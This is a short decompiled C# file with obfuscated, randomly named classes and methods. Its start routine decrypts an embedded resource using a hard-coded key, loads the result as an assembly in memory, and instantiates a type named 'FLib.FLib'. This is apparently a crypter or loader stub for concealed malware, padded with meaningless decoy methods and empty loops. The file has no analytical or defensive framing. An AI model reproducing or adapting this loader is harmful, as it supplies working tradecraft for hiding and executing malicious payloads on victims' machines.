using System;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using bjrdkskshrst.My.Resources;

namespace bjrdkskshrst;

[StandardModule]
public sealed class Ebwkgnc393T5N9S92V
{
	public static void start()
	{
		gNRVMNBJR24sjfpdB9w(frf7wDBCWfpy5HLtLRL(AppDomain.CurrentDomain.Load((byte[])mgW5WoBbkh0iw2e8NSE(Jk8vgqBZnbaqpR5w5ab(), "FBpKzqFPxxk")), "FLib.FLib"));
	}

	public static object A1oj2R8CSyALyX6bpcqx9()
	{
		_ = 1;
		if (!mmh8DYBXyi4N2kNemCt())
		{
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				while (true)
				{
				}
			}
		}
	}

	internal static object Jk8vgqBZnbaqpR5w5ab()
	{
		return Resources.bjrdkskshrst;
	}

	internal static object mgW5WoBbkh0iw2e8NSE(object object_0, object object_1)
	{
		return gNCKD9aZ5KQR2cPI.smethod_0((byte[])object_0, (string)object_1);
	}

	internal static Type frf7wDBCWfpy5HLtLRL(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetType((string)object_1);
	}

	internal static object gNRVMNBJR24sjfpdB9w(Type type_0)
	{
		return Activator.CreateInstance(type_0);
	}

	internal static bool Cp3YAqBslLe6q2WTTN5()
	{
		return true;
	}

	internal static bool mmh8DYBXyi4N2kNemCt()
	{
		return false;
	}

	internal static void auGMUUBGk5DqbwCgPKx(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static void BRktYnBKW3uEJ6Z7N9s()
	{
		ProjectData.ClearProjectError();
	}
}
